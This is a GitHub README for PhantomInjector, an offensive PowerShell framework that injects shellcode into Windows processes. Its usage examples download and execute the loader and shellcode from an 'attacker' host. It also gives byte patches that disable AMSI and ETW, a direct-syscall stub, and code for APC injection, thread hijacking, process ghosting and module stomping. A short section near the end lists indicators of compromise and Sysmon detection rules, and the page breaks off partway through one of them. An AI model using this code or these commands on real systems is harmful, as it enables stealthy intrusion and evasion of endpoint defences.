# https://github.com/MazX0p/PhantomInjector

[Skip to content](https://github.com/MazX0p/PhantomInjector#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/MazX0p/PhantomInjector) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/MazX0p/PhantomInjector) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/MazX0p/PhantomInjector) to refresh your session.Dismiss alert

{{ message }}

[MazX0p](https://github.com/MazX0p)/ **[PhantomInjector](https://github.com/MazX0p/PhantomInjector)** Public

- [Notifications](https://github.com/login?return_to=%2FMazX0p%2FPhantomInjector) You must be signed in to change notification settings
- [Fork\\
10](https://github.com/login?return_to=%2FMazX0p%2FPhantomInjector)
- [Star\\
72](https://github.com/login?return_to=%2FMazX0p%2FPhantomInjector)


Advanced In-Memory PowerShell Process Injection Framework


[72\\
stars](https://github.com/MazX0p/PhantomInjector/stargazers) [10\\
forks](https://github.com/MazX0p/PhantomInjector/forks) [Branches](https://github.com/MazX0p/PhantomInjector/branches) [Tags](https://github.com/MazX0p/PhantomInjector/tags) [Activity](https://github.com/MazX0p/PhantomInjector/activity)

[Star](https://github.com/login?return_to=%2FMazX0p%2FPhantomInjector)

[Notifications](https://github.com/login?return_to=%2FMazX0p%2FPhantomInjector) You must be signed in to change notification settings

# MazX0p/PhantomInjector

main

[**2** Branches](https://github.com/MazX0p/PhantomInjector/branches) [**0** Tags](https://github.com/MazX0p/PhantomInjector/tags)

[Go to Branches page](https://github.com/MazX0p/PhantomInjector/branches)[Go to Tags page](https://github.com/MazX0p/PhantomInjector/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![MazX0p](https://avatars.githubusercontent.com/u/54814433?v=4&size=40)](https://github.com/MazX0p)[MazX0p](https://github.com/MazX0p/PhantomInjector/commits?author=MazX0p)<br>[Update PhantomInjector.ps1](https://github.com/MazX0p/PhantomInjector/commit/2b71103c291037f3ed067730cfeb45d11e440875)<br>7 months agoJul 16, 2025<br>[2b71103](https://github.com/MazX0p/PhantomInjector/commit/2b71103c291037f3ed067730cfeb45d11e440875) · 7 months agoJul 16, 2025<br>## History<br>[21 Commits](https://github.com/MazX0p/PhantomInjector/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/MazX0p/PhantomInjector/commits/main/) 21 Commits |
| [PhantomInjector.ps1](https://github.com/MazX0p/PhantomInjector/blob/main/PhantomInjector.ps1 "PhantomInjector.ps1") | [PhantomInjector.ps1](https://github.com/MazX0p/PhantomInjector/blob/main/PhantomInjector.ps1 "PhantomInjector.ps1") | [Update PhantomInjector.ps1](https://github.com/MazX0p/PhantomInjector/commit/2b71103c291037f3ed067730cfeb45d11e440875 "Update PhantomInjector.ps1") | 7 months agoJul 16, 2025 |
| [README.md](https://github.com/MazX0p/PhantomInjector/blob/main/README.md "README.md") | [README.md](https://github.com/MazX0p/PhantomInjector/blob/main/README.md "README.md") | [Update README.md](https://github.com/MazX0p/PhantomInjector/commit/97f495dbb02939cea06fa3632ba40710e432c59b "Update README.md  V2") | 7 months agoJul 16, 2025 |
| View all files |

## Repository files navigation

# PhantomInjector – Advanced In-Memory Process Injection Framework

[Permalink: PhantomInjector – Advanced In-Memory Process Injection Framework](https://github.com/MazX0p/PhantomInjector#phantominjector--advanced-in-memory-process-injection-framework)

[![Use: Red Team](https://camo.githubusercontent.com/bff7072916c597e131497173d8478b9cfb236ac18fa9766781b69aadb7e18646/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f5573652d5265645f5465616d2d6f72616e6765)](https://camo.githubusercontent.com/bff7072916c597e131497173d8478b9cfb236ac18fa9766781b69aadb7e18646/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f5573652d5265645f5465616d2d6f72616e6765)[![License: MIT](https://camo.githubusercontent.com/d6bc2b26794002c24d023acaab01b6dbb953c57ab9cb80ba5b8aa2f2bd5de99a/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d4d49542d626c7565)](https://camo.githubusercontent.com/d6bc2b26794002c24d023acaab01b6dbb953c57ab9cb80ba5b8aa2f2bd5de99a/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d4d49542d626c7565)[![OS: Windows](https://camo.githubusercontent.com/43242d8de5e189e7d45a6979396192358e07a6115eb11c0299299e8108aae552/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4f532d57696e646f77732d6c6967687467726579)](https://camo.githubusercontent.com/43242d8de5e189e7d45a6979396192358e07a6115eb11c0299299e8108aae552/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4f532d57696e646f77732d6c6967687467726579)

A stealthy PowerShell-based process injection framework implementing multiple in-memory techniques with evasion capabilities, designed for red team engagements and penetration testing.

* * *

## Features

[Permalink: Features](https://github.com/MazX0p/PhantomInjector#features)

- **Multiple Injection Techniques**
  - APC Injection (Early Bird + `QueueUserAPC`)
  - Thread Hijacking with crash protection
  - Process Ghosting
  - Classic Remote Thread Injection
  - Module Stomping v2 (end‑of‑image tail write)
- **Evasion Capabilities**
  - AMSI bypass via function patching
  - ETW bypass via `EtwEventWrite` hooking
  - NTDLL unhooking from disk
  - Direct syscall support (via in-memory assembly)
- **Operational Security**
  - Anti-debug checks
  - Sandbox detection
  - Dynamic payload loading

* * *

## Architecture

[Permalink: Architecture](https://github.com/MazX0p/PhantomInjector#architecture)

Render

Loading

```
graph TD
    A[Payload Source] --> B{Local/Remote}
    B --> C[Local File]
    B --> D[Web Download]
    C --> E[In-Memory Load]
    D --> E
    E --> F[Evasion Checks]
    F --> G[Injection Method]
    G --> H[APC/ThreadHijack/Ghosting//ModuleStomp/RemoteThread]
    H --> I[Shellcode Execution]
```

* * *

## Usage

[Permalink: Usage](https://github.com/MazX0p/PhantomInjector#usage)

### 1\. Basic Injection

[Permalink: 1. Basic Injection](https://github.com/MazX0p/PhantomInjector#1-basic-injection)

```
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PhantomInjector.ps1')
Invoke-PhantomInjector `
  -PayloadPath shellcode.bin `
  -ProcessName notepad `
  -InjectionMethod APC
```

[![image](https://private-user-images.githubusercontent.com/54814433/462852019-edd8ce55-6731-427f-a660-6f2f4f2ce9e0.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI3MDcsIm5iZiI6MTc3MTQxMjQwNywicGF0aCI6Ii81NDgxNDQzMy80NjI4NTIwMTktZWRkOGNlNTUtNjczMS00MjdmLWE2NjAtNmYyZjRmMmNlOWUwLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDAwN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTAyODA2NmFjOTJkZjVlZjU2ZmFjYjBhODY4M2E2MTVkYjM2NWM2YTIzZTY0ZDFlMTRhMGIxZWNkYjk2ZjIzNTImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0._daZJ3kGw88c638BpElkInX9JCAEhweA7lB-n-PGR1M)](https://private-user-images.githubusercontent.com/54814433/462852019-edd8ce55-6731-427f-a660-6f2f4f2ce9e0.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI3MDcsIm5iZiI6MTc3MTQxMjQwNywicGF0aCI6Ii81NDgxNDQzMy80NjI4NTIwMTktZWRkOGNlNTUtNjczMS00MjdmLWE2NjAtNmYyZjRmMmNlOWUwLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDAwN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTAyODA2NmFjOTJkZjVlZjU2ZmFjYjBhODY4M2E2MTVkYjM2NWM2YTIzZTY0ZDFlMTRhMGIxZWNkYjk2ZjIzNTImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0._daZJ3kGw88c638BpElkInX9JCAEhweA7lB-n-PGR1M)

### 2\. Remote Payload with ETW/AMSI Bypass

[Permalink: 2. Remote Payload with ETW/AMSI Bypass](https://github.com/MazX0p/PhantomInjector#2-remote-payload-with-etwamsi-bypass)

```
iex (irm http://attacker/PhantomInjector.ps1)
Invoke-PhantomInjector `
  -PayloadUrl http://attacker/shellcode.bin `
  -BypassAMSI `
  -BypassETW `
  -InjectionMethod ThreadHijack
```

[![image](https://private-user-images.githubusercontent.com/54814433/462852204-820f0432-3519-4591-a1e3-acc58a5bfc01.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI3MDcsIm5iZiI6MTc3MTQxMjQwNywicGF0aCI6Ii81NDgxNDQzMy80NjI4NTIyMDQtODIwZjA0MzItMzUxOS00NTkxLWExZTMtYWNjNThhNWJmYzAxLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDAwN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWY4NDhmYjUxMzhlMjBkY2FmNzFlYWMyNDVjYzI0NTdmMzY5YTgwZjEwODM2MzM1NzVkMDMwYTY1MTZkYmU4N2MmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.jlhvX3aHuRhd8mW_ZE9UwPb-cE2LPrASMhmegl5I0VE)](https://private-user-images.githubusercontent.com/54814433/462852204-820f0432-3519-4591-a1e3-acc58a5bfc01.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI3MDcsIm5iZiI6MTc3MTQxMjQwNywicGF0aCI6Ii81NDgxNDQzMy80NjI4NTIyMDQtODIwZjA0MzItMzUxOS00NTkxLWExZTMtYWNjNThhNWJmYzAxLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDAwN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWY4NDhmYjUxMzhlMjBkY2FmNzFlYWMyNDVjYzI0NTdmMzY5YTgwZjEwODM2MzM1NzVkMDMwYTY1MTZkYmU4N2MmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.jlhvX3aHuRhd8mW_ZE9UwPb-cE2LPrASMhmegl5I0VE)

### 3\. Process Ghosting (No Disk)

[Permalink: 3. Process Ghosting (No Disk)](https://github.com/MazX0p/PhantomInjector#3-process-ghosting-no-disk)

```
$loader = [System.Text.Encoding]::UTF8.GetString((
  Invoke-WebRequest 'http://attacker/PhantomInjector.ps1').Content)
iex $loader
Invoke-PhantomInjector `
  -PayloadUrl http://attacker/beacon.bin `
  -InjectionMethod GhostProcess
```

[![image](https://private-user-images.githubusercontent.com/54814433/462850543-55a5a903-e079-4270-8781-132153e933d3.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI3MDcsIm5iZiI6MTc3MTQxMjQwNywicGF0aCI6Ii81NDgxNDQzMy80NjI4NTA1NDMtNTVhNWE5MDMtZTA3OS00MjcwLTg3ODEtMTMyMTUzZTkzM2QzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDAwN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTExYWQ0MTZhODZlNTZiYzA0ZDBmMjczMDMzZmIwOGJmZDkxMzAxZGEwNjNhNmE3ZDY2YThiYjA5OTBjZGY0NzAmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.S2pl5lL3f1xzuOpR08UBmcMXvq6XCYvSEJxcci6vqYo)](https://private-user-images.githubusercontent.com/54814433/462850543-55a5a903-e079-4270-8781-132153e933d3.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI3MDcsIm5iZiI6MTc3MTQxMjQwNywicGF0aCI6Ii81NDgxNDQzMy80NjI4NTA1NDMtNTVhNWE5MDMtZTA3OS00MjcwLTg3ODEtMTMyMTUzZTkzM2QzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDAwN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTExYWQ0MTZhODZlNTZiYzA0ZDBmMjczMDMzZmIwOGJmZDkxMzAxZGEwNjNhNmE3ZDY2YThiYjA5OTBjZGY0NzAmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.S2pl5lL3f1xzuOpR08UBmcMXvq6XCYvSEJxcci6vqYo)

### 4\. Syscall-Only Injection

[Permalink: 4. Syscall-Only Injection](https://github.com/MazX0p/PhantomInjector#4-syscall-only-injection)

```
Invoke-PhantomInjector -PayloadUrl http://attacker/sc.bin `
    -UseSyscalls `
    -InjectionMethod RemoteThread `
    -BypassETW
```

[![image](https://private-user-images.githubusercontent.com/54814433/462852079-ef7831e5-524d-4910-920a-ba17cf5faeea.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI3MDcsIm5iZiI6MTc3MTQxMjQwNywicGF0aCI6Ii81NDgxNDQzMy80NjI4NTIwNzktZWY3ODMxZTUtNTI0ZC00OTEwLTkyMGEtYmExN2NmNWZhZWVhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDAwN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWViYThiNzQ0ODQwOGM1NzkxMDZkNGVkMWU2NGQwZmVhMzE1MTBiZjU5MDdmZmI4MTBjMzViNzFhMWM5MTEzMWYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.APjcCMJBzOL9XWPzWgxrpJK_3_iT4mYS8nLERmv4uI8)](https://private-user-images.githubusercontent.com/54814433/462852079-ef7831e5-524d-4910-920a-ba17cf5faeea.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI3MDcsIm5iZiI6MTc3MTQxMjQwNywicGF0aCI6Ii81NDgxNDQzMy80NjI4NTIwNzktZWY3ODMxZTUtNTI0ZC00OTEwLTkyMGEtYmExN2NmNWZhZWVhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDAwN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWViYThiNzQ0ODQwOGM1NzkxMDZkNGVkMWU2NGQwZmVhMzE1MTBiZjU5MDdmZmI4MTBjMzViNzFhMWM5MTEzMWYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.APjcCMJBzOL9XWPzWgxrpJK_3_iT4mYS8nLERmv4uI8)

### 5\. Module Stomping v2

[Permalink: 5. Module Stomping v2](https://github.com/MazX0p/PhantomInjector#5-module-stomping-v2)

```
iex (irm http://attacker/PhantomInjector.ps1)
Invoke-PhantomInjector `
  -PayloadPath calc.bin `
  -InjectionMethod ModuleStomping `
  -ProcessName notepad `
  -TimeoutMS 2000
```

[![image](https://private-user-images.githubusercontent.com/54814433/467191595-9b20bea6-b544-4789-a3b1-c4836461d89a.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI3MDcsIm5iZiI6MTc3MTQxMjQwNywicGF0aCI6Ii81NDgxNDQzMy80NjcxOTE1OTUtOWIyMGJlYTYtYjU0NC00Nzg5LWEzYjEtYzQ4MzY0NjFkODlhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDAwN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWZiNDMzZDVmYzdjYmUzODU3NjNiNGUzM2QyMDIwNzQ5MWNkZDVhZWJmYWU3M2IwY2I3NjRiZTBjODUwNmVkOTMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.RO1TKpSr673dZgk_tFXy_HM-fR41VvXaExkIpg6v3Kw)](https://private-user-images.githubusercontent.com/54814433/467191595-9b20bea6-b544-4789-a3b1-c4836461d89a.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI3MDcsIm5iZiI6MTc3MTQxMjQwNywicGF0aCI6Ii81NDgxNDQzMy80NjcxOTE1OTUtOWIyMGJlYTYtYjU0NC00Nzg5LWEzYjEtYzQ4MzY0NjFkODlhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDAwN1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWZiNDMzZDVmYzdjYmUzODU3NjNiNGUzM2QyMDIwNzQ5MWNkZDVhZWJmYWU3M2IwY2I3NjRiZTBjODUwNmVkOTMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.RO1TKpSr673dZgk_tFXy_HM-fR41VvXaExkIpg6v3Kw)

* * *

## Technical Deep Dive

[Permalink: Technical Deep Dive](https://github.com/MazX0p/PhantomInjector#technical-deep-dive)

### Evasion Techniques

[Permalink: Evasion Techniques](https://github.com/MazX0p/PhantomInjector#evasion-techniques)

#### AMSI Bypass

[Permalink: AMSI Bypass](https://github.com/MazX0p/PhantomInjector#amsi-bypass)

Patches **AmsiScanBuffer** in memory to return `0x80070057` (`E_INVALIDARG`):

Render

Loading

```
graph LR
    A[Get AmsiScanBuffer] --> B[Patch Instructions]
    B --> C[MOV EAX, 0x80070057]
    C --> D[RET]
```

* * *

```
byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax,0x80070057; ret
```

#### ETW Bypass

[Permalink: ETW Bypass](https://github.com/MazX0p/PhantomInjector#etw-bypass)

Overwrites **EtwEventWrite** with a single `RET` instruction:

Render

Loading

```
flowchart TD
    A[Locate EtwEventWrite] --> B[Overwrite with RET]
    B --> C[Logging Disabled]
```

```
byte[] patch = { 0xC3 }; // ret
```

* * *

#### NTDLL Unhooking

[Permalink: NTDLL Unhooking](https://github.com/MazX0p/PhantomInjector#ntdll-unhooking)

1. Load a clean copy of `ntdll.dll` from disk.
2. Compare exported function bytes against the in-memory copy.
3. Overwrite hooked functions in memory:

Render

Loading

```
sequenceDiagram
    participant C as Clean NTDLL
    participant H as Hooked NTDLL
    C->>H: Compare Exports
    loop Each Function
        H->>H: Overwrite Hooked Bytes
    end
```

```
Marshal.Copy(cleanBytes, 0, hookedAddr, 0x20);
```

* * *

#### Syscall Implementation

[Permalink: Syscall Implementation](https://github.com/MazX0p/PhantomInjector#syscall-implementation)

Render

Loading

```
sequenceDiagram
    participant P as PowerShell
    participant M as Memory
    participant K as Kernel

    P->>M: Allocate stub memory (RWX)
    P->>M: Write syscall assembly
    P->>K: Execute via SYSCALL
    alt Success
        K-->>P: Return status
    else Failure
        K-->>P: NTSTATUS error
        P->>P: Fallback to WinAPI
    end
```

```
byte[] CreateSyscallStub(uint syscallId) {
    return new byte[] {
        0x4C, 0x8B, 0xD1,             // mov r10, rcx
        0xB8,                          // mov eax [next 4 bytes]
        (byte)(syscallId & 0xFF),      // syscall ID low byte
        (byte)((syscallId >> 8) & 0xFF),
        (byte)((syscallId >> 16) & 0xFF),
        (byte)((syscallId >> 24) & 0xFF),
        0x0F, 0x05,                    // syscall
        0xC3                           // ret
    };
}
```

**Supported NTAPI Functions**

| Syscall | Number | Usage Context |
| --- | --- | --- |
| `NtCreateThreadEx` | 0xC0 | Thread Hijacking |
| `NtAllocateVirtualMemory` | 0x18 | Process Ghosting |
| `NtQueueApcThread` | 0x42 | APC Injection |
| `NtGetContextThread` | 0x?? | Module Stomping |
| `NtSetContextThread` | 0x?? | Module Stomping |

**Enhanced Detection Table**

| Technique | WinAPI Detection Risk | Syscall Detection Risk |
| --- | --- | --- |
| APC Injection | High | Medium |
| Thread Hijacking | Medium | Low |
| Process Ghosting | High | Medium |
| Module Stomping | Medium | Low |

**Pro Tip**
Combine with -UnhookNTDLL for clean syscall execution environment

* * *

### Injection Methods

[Permalink: Injection Methods](https://github.com/MazX0p/PhantomInjector#injection-methods)

#### 1 APC Injection

[Permalink: 1 APC Injection](https://github.com/MazX0p/PhantomInjector#1-apc-injection)

1. Allocate RWX memory in the target process (`VirtualAllocEx`).
2. Write shellcode (`WriteProcessMemory`).
3. Queue APC to all threads (`QueueUserAPC`).
4. Resume threads to trigger execution.

Render

Loading

```
graph TD
    A[Allocate RWX Memory] --> B[Write Shellcode]
    B --> C[Open Target Threads]
    C --> D[Queue APC to Threads]
    D --> E[Resume Threads]
    E --> F[Shellcode Executes]
```

```
QueueUserAPC(allocAddr, hThread, IntPtr.Zero);
ResumeThread(hThread);
```

* * *

#### 2 Thread Hijacking

[Permalink: 2 Thread Hijacking](https://github.com/MazX0p/PhantomInjector#2-thread-hijacking)

1. Enumerate and suspend a target thread.
2. Capture and save its context.
3. Write shellcode to a new RWX region.
4. Redirect the thread’s instruction pointer (`Rip/Eip`).
5. Resume thread.

Render

Loading

```
sequenceDiagram
    participant A as Attacker
    participant T as Target Thread
    A->>T: SuspendThread()
    A->>T: GetThreadContext()
    A->>T: Modify RIP to Shellcode
    A->>T: SetThreadContext()
    A->>T: ResumeThread()
    loop Timeout Protection
        A->>T: Restore Original Context
    end
```

```
context.Rip = (ulong)allocAddr;
SetThreadContext(hThread, ref context);
```

* * *

#### 3 Process Ghosting

[Permalink: 3 Process Ghosting](https://github.com/MazX0p/PhantomInjector#3-process-ghosting)

1. Begin an NTFS transaction (TxF).
2. Write a legitimate template EXE into the transaction.
3. Spawn the process suspended via `NtCreateSection` / `NtCreateProcessEx`.
4. Inject shellcode.
5. Commit the transaction to delete the on-disk file, leaving only the in-memory process.

Render

Loading

```
flowchart LR
    A[Create Temp File] --> B[Mark for Deletion]
    B --> C[Create Section]
    C --> D[Spawn Process]
    D --> E[Inject Shellcode]
    E --> F[Resume Process]
```

```
NtCreateSection(out hSection, SEC_ALL_ACCESS, IntPtr.Zero, 0,
                PAGE_EXEC_READ, SEC_IMAGE, hFile);
NtCreateProcessEx(out hProcess, PROC_ALL_ACCESS, IntPtr.Zero,
                  GetCurrentProcess(), CREATE_SUSPENDED, hSection, …);
```

#### 4 Module Stomping Injection (Tail + Hijack Fallback)

[Permalink: 4 Module Stomping Injection (Tail + Hijack Fallback)](https://github.com/MazX0p/PhantomInjector#4-module-stomping-injection-tail--hijack-fallback)

This method:

1. Finds a suitable DLL in the target process and computes a “tail‑of‑image” address (base + SizeOfImage − shellcode.Length).

2. Backs up the original bytes at that region.

3. Changes protection to RWX and writes shellcode.

4. Restores original protection.

5. Suspends one thread, uses NtGetContextThread/NtSetContextThread to set its RIP/EIP to the shellcode address.

6. Resumes the thread to guarantee execution.

7. After timeout, restores the original bytes and protections if the process is still alive.


Render

Loading

```
flowchart LR
    A[Find suitable DLL & compute tail-of-image address] --> B[Backup original bytes]
    B --> C[Change protection to RWX & write shellcode]
    C --> D[Restore original protection]
    D --> E[Suspend a thread & NtGetContextThread/NtSetContextThread to set RIP/EIP]
    E --> F[Resume thread for execution]
    F --> G[After timeout, restore original bytes & protections]
```

```
// Pseudocode snippet for the thread‑hijack fallback
IntPtr target = baseAddr + (SizeOfImage - shellcode.Length);
Backup(original);
Protect(target, PAGE_EXECUTE_READWRITE);
WriteMemory(target, shellcode);
RestoreProtect(target, originalProt);

// Hijack context:
NtGetContextThread(hThread, &ctx);
ctx.Rip = (ulong)target;
NtSetContextThread(hThread, &ctx);
ResumeThread(hThread);
```

* * *

## Detection & Mitigation

[Permalink: Detection & Mitigation](https://github.com/MazX0p/PhantomInjector#detection--mitigation)

### Indicators of Compromise (IoCs)

[Permalink: Indicators of Compromise (IoCs)](https://github.com/MazX0p/PhantomInjector#indicators-of-compromise-iocs)

- PowerShell spawning uncommon processes with network connections (e.g., Notepad).
- RWX memory allocations in high-privilege processes.
- APC calls to non-module memory regions.
- Unusual patches in `ntdll.dll` at runtime.

### Defensive Measures

[Permalink: Defensive Measures](https://github.com/MazX0p/PhantomInjector#defensive-measures)

```
# Sysmon Configuration Snippet
- rule: PhantomInjector Detection
  desc: Detects common injection patterns from PowerShell
  conditions:
    - ParentImage: "powershell.exe"
    - (AllocationProtect: "0x40" OR Protect: "0x40")  # PAGE_EXECUTE_READWRITE
    - CreateRemoteThread: true
  action: alert
```

### Sysmon Detection Rules

[Permalink: Sysmon Detection Rules](https://github.com/MazX0p/PhantomInjector#sysmon-detection-rules)

#### 1\. **Base Rule for PhantomInjector Activity**

[Permalink: 1. Base Rule for PhantomInjector Activity](https://github.com/MazX0p/PhantomInjector#1-base-rule-for-phantominjector-activity)

```
<RuleGroup name="PhantomInjector" groupRelation="or">
    <ProcessCreate onmatch="include">
        <!-- PowerShell spawning uncommon targets -->
        <CommandLine condition="contains">-InjectionMethod</CommandLine>
        <ParentImage condition="end with">\powershell.exe</ParentImage>
        <Image condition="contains">\notepad.exe</Image>
    </ProcessCreate>
</RuleGroup>
```

#### 2\. **Syscall-Specific Detection**

[Permalink: 2. Syscall-Specific Detection](https://github.com/MazX0p/PhantomInjector#2-syscall-specific-detection)

```
<RuleGroup name="DirectSyscall_Detection" groupRelation="and">
    <ProcessCreate onmatch="include">
        <CommandLine condition="contains">-UseSyscalls</CommandLine>
    </ProcessCreate>
    <FileCreate onmatch="include">
        <!-- Detects NTDLL unhooking -->
